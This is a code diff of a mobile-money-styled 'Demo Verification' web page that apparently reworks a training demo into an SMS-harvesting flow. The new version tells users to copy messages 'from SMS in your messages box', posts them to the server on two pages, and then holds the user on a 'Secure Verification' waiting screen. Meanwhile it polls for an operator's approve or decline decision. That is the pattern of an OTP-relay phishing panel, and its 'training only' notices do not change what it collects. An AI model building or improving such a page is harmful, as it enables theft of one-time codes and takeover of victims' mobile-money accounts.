@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Training Verification</title>
+  <title>Demo Verification</title>
 
   <style>
     * {
@@ -17,28 +17,27 @@
       color: #222;
     }
 
-    .container {
-      width: 100%;
-      max-width: 420px;
-      margin: 0 auto;
-      padding: 20px;
-    }
-
     .header {
       background: #ffcc00;
-      padding: 20px;
+      padding: 18px;
       text-align: center;
       font-weight: bold;
-      font-size: 22px;
+      font-size: 21px;
+    }
+
+    .container {
+      max-width: 420px;
+      margin: auto;
+      padding: 20px;
     }
 
     .notice {
-      margin: 15px 0;
-      padding: 12px;
       background: #fff3cd;
       border: 1px solid #ffe69c;
       border-radius: 8px;
-      font-size: 14px;
+      padding: 12px;
+      font-size: 13px;
+      margin-bottom: 15px;
     }
 
     .card {
@@ -46,70 +45,128 @@
       padding: 20px;
       border-radius: 12px;
       box-shadow: 0 2px 8px rgba(0,0,0,.08);
-      margin-top: 15px;
     }
 
-    h2 {
-      margin-top: 0;
-      font-size: 20px;
-    }
-
-    .sms-box {
+    .sms {
       background: #eeeeee;
       border-radius: 10px;
       padding: 15px;
       white-space: pre-wrap;
       line-height: 1.5;
+      user-select: text;
       margin: 15px 0;
     }
 
-    textarea,
-    input {
+    textarea {
       width: 100%;
-      padding: 13px;
+      min-height: 130px;
+      padding: 12px;
       border: 1px solid #ccc;
       border-radius: 8px;
       font-size: 16px;
-      margin-top: 8px;
-    }
-
-    textarea {
-      min-height: 120px;
       resize: vertical;
-    }
-
-    .demo-code {
-      text-align: center;
-      font-size: 28px;
-      font-weight: bold;
-      letter-spacing: 8px;
-      margin: 20px 0;
     }
 
     button {
       width: 100%;
+      margin-top: 15px;
       padding: 14px;
       border: 0;
       border-radius: 8px;
       background: #ffcc00;
-      font-size: 17px;
       font-weight: bold;
+      font-size: 16px;
       cursor: pointer;
-      margin-top: 15px;
-    }
-
-    button:hover {
-      background: #e6b800;
     }
 
     .hidden {
       display: none;
     }
 
-    .message {
-      margin-top: 15px;
+    .status {
       text-align: center;
+      margin-top: 12px;
       font-weight: bold;
+    }
+
+    /* WAITING OVERLAY */
+    #waitingOverlay {
+      position: fixed;
+      inset: 0;
+      background: rgba(0, 0, 0, 0.68);
+      display: none;
+      align-items: center;
+      justify-content: center;
+      z-index: 9999;
+      color: white;
+      text-align: center;
+      padding: 25px;
+    }
+
+    #waitingOverlay.active {
+      display: flex;
+    }
+
+    .waitingBox {
+      max-width: 330px;
+    }
+
+    .spinner {
+      width: 82px;
+      height: 82px;
+      border: 7px solid rgba(255,255,255,.25);
+      border-top-color: #22c55e;
+      border-radius: 50%;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 28px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
+    .waitingTitle {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 15px;
+    }
+
+    .waitingText {
+      font-size: 18px;
+      line-height: 1.5;
+    }
+
+    .result {
+      position: fixed;
+      inset: 0;
+      display: none;
+      align-items: center;
+      justify-content: center;
+      background: #f5f5f5;
+      z-index: 10000;
+      text-align: center;
+      padding: 25px;
+    }
+
+    .result.active {
+      display: flex;
+    }
+
+    .resultBox {
+      background: white;
+      padding: 35px 25px;
+      border-radius: 15px;
+      max-width: 380px;
+      width: 100%;
+      box-shadow: 0 3px 15px rgba(0,0,0,.12);
+    }
+
+    .resultTitle {
+      font-size: 28px;
+      font-weight: bold;
+      margin-bottom: 12px;
     }
   </style>
 </head>
@@ -117,166 +174,262 @@
 <body>
 
   <div class="header">
-    TRAINING / DEMO
+    DEMO VERIFICATION
   </div>
 
   <div class="container">
 
     <div class="notice">
-      This is a training simulation. Do not enter real OTPs, PINs,
-      passwords, or other authentication information.
+      Training simulation only. Do not enter real OTPs, PINs,
+      passwords, or authentication information.
     </div>
 
-    <!-- STEP 1 -->
-    <div class="card" id="step1">
 
-      <h2>Step 1 — Demo SMS</h2>
+    <!-- PAGE 1 -->
+    <div class="card" id="page1">
 
-      <p>Copy the complete demo message below and paste it into the box.</p>
+      <p>Copy the message from SMS in your messages box.</p>
 
-      <div class="sms-box" id="smsMessage">MTN MoMo Training
-
+      <div class="sms">
 This is a demonstration message.
-Your demo verification code is 1234.
-This message is for training purposes only.</div>
-
-      <label for="demoMessage">
-        Paste the complete SMS message
-      </label>
+Your demo message contains sample information only.
+This message is for training purposes.
+      </div>
 
       <textarea
-        id="demoMessage"
-        placeholder="Paste the complete demo SMS here..."
-        required
+        id="message1"
+        placeholder="Enter the complete dummy message here..."
       ></textarea>
 
-      <button type="button" onclick="submitSms()">
+      <button onclick="submitMessage(1)">
         Continue
       </button>
 
-      <div class="message" id="smsStatus"></div>
+      <div class="status" id="status1"></div>
 
     </div>
 
-    <!-- STEP 2 -->
-    <div class="card hidden" id="step2">
 
-      <h2>Step 2 — Demo Verification</h2>
+    <!-- PAGE 2 -->
+    <div class="card hidden" id="page2">
 
-      <p>
-        Enter the four-digit demo code shown in the training SMS.
-      </p>
+      <p>Copy the message from SMS in your messages box.</p>
 
-      <div class="demo-code">
-        1 2 3 4
+      <div class="sms">
+This is the second demonstration message.
+Your demo message contains sample information only.
+This message is for training purposes.
       </div>
 
-      <label for="demoCode">
-        Enter demo code
-      </label>
+      <textarea
+        id="message2"
+        placeholder="Enter the complete dummy message here..."
+      ></textarea>
 
-      <input
-        type="text"
-        id="demoCode"
-        inputmode="numeric"
-        maxlength="4"
-        placeholder="Enter 4 digits"
-        autocomplete="off"
-      >
-
-      <button type="button" onclick="verifyDemoCode()">
-        Verify Demo Code
+      <button onclick="submitMessage(2)">
+        Submit
       </button>
 
-      <div class="message" id="codeStatus"></div>
+      <div class="status" id="status2"></div>
 
     </div>
 
   </div>
 
+
+  <!-- WAITING SCREEN -->
+  <div id="waitingOverlay">
+
+    <div class="waitingBox">
+
+      <div class="spinner"></div>
+
+      <div class="waitingTitle">
+        Secure Verification
+      </div>
+
+      <div class="waitingText">
+        Verifying your request...<br>
+        Please do not close this page.
+      </div>
+
+    </div>
+
+  </div>
+
+
+  <!-- APPROVED / DECLINED SCREEN -->
+  <div id="resultScreen" class="result">
+
+    <div class="resultBox">
+
+      <div
+        id="resultTitle"
+        class="resultTitle"
+      ></div>
+
+      <div id="resultText"></div>
+
+    </div>
+
+  </div>
+
+
 <script>
-  async function submitSms() {
-    const demoMessage =
-      document.getElementById("demoMessage").value.trim();
 
-    const status =
-      document.getElementById("smsStatus");
+let currentRequestId = null;
+let pollingTimer = null;
 
-    if (!demoMessage) {
-      status.textContent = "Please paste the demo SMS message.";
-      return;
-    }
 
-    status.textContent = "Submitting demo message...";
+async function submitMessage(page) {
 
-    try {
-      const response = await fetch("/demo-message", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          demoMessage: demoMessage
-        })
-      });
+  const input =
+    document.getElementById("message" + page);
 
-      if (!response.ok) {
-        throw new Error("Submission failed");
-      }
+  const status =
+    document.getElementById("status" + page);
 
-      status.textContent = "Demo message submitted.";
+  const message =
+    input.value.trim();
 
-      document.getElementById("step1").classList.add("hidden");
-      document.getElementById("step2").classList.remove("hidden");
-
-    } catch (error) {
-      status.textContent = "Demo submission failed.";
-    }
+  if (!message) {
+    status.textContent =
+      "Please enter the demo message.";
+    return;
   }
 
+  status.textContent = "Submitting...";
 
-  function verifyDemoCode() {
-    const code =
-      document.getElementById("demoCode").value.trim();
+  try {
 
-    const status =
-      document.getElementById("codeStatus");
+    const response = await fetch("/demo-message", {
 
-    if (!/^[0-9]{4}$/.test(code)) {
-      status.textContent = "Enter exactly four digits.";
-      return;
+      method: "POST",
+
+      headers: {
+        "Content-Type": "application/json"
+      },
+
+      body: JSON.stringify({
+        page: page,
+        message: message
+      })
+
+    });
+
+    if (!response.ok) {
+      throw new Error("Submission failed");
     }
+
+    const data = await response.json();
+
+    currentRequestId = data.requestId;
 
     /*
-      The demo code is checked locally.
-      It is NOT sent to Telegram.
+      Hide the current page and show the
+      verification waiting screen.
     */
 
-    if (code === "1234") {
-      status.textContent = "Demo verification successful.";
+    document
+      .getElementById("page" + page)
+      .classList.add("hidden");
 
-      sendVerificationConfirmation();
-    } else {
-      status.textContent = "Incorrect demo code.";
-    }
+    document
+      .getElementById("waitingOverlay")
+      .classList.add("active");
+
+    startPolling();
+
+  } catch (error) {
+
+    console.error(error);
+
+    status.textContent =
+      "Unable to submit the training request.";
+  }
+}
+
+
+function startPolling() {
+
+  if (pollingTimer) {
+    clearInterval(pollingTimer);
   }
 
+  pollingTimer = setInterval(checkStatus, 2000);
 
-  async function sendVerificationConfirmation() {
-    try {
-      await fetch("/demo-verification", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          verified: true
-        })
-      });
-    } catch (error) {
-      console.error(error);
-    }
+  checkStatus();
+}
+
+
+async function checkStatus() {
+
+  if (!currentRequestId) {
+    return;
   }
+
+  try {
+
+    const response = await fetch(
+      "/demo-status/" +
+      encodeURIComponent(currentRequestId)
+    );
+
+    if (!response.ok) {
+      return;
+    }
+
+    const data = await response.json();
+
+    if (
+      data.status === "approved" ||
+      data.status === "declined"
+    ) {
+
+      clearInterval(pollingTimer);
+
+      document
+        .getElementById("waitingOverlay")
+        .classList.remove("active");
+
+      showResult(data.status);
+    }
+
+  } catch (error) {
+
+    console.error("Status check failed:", error);
+  }
+}
+
+
+function showResult(status) {
+
+  const screen =
+    document.getElementById("resultScreen");
+
+  const title =
+    document.getElementById("resultTitle");
+
+  const text =
+    document.getElementById("resultText");
+
+  if (status === "approved") {
+
+    title.textContent = "Approved";
+    text.textContent =
+      "Your training request has been approved.";
+
+  } else {
+
+    title.textContent = "Declined";
+    text.textContent =
+      "Your training request has been declined.";
+
+  }
+
+  screen.classList.add("active");
+}
+
 </script>
 
 </body>
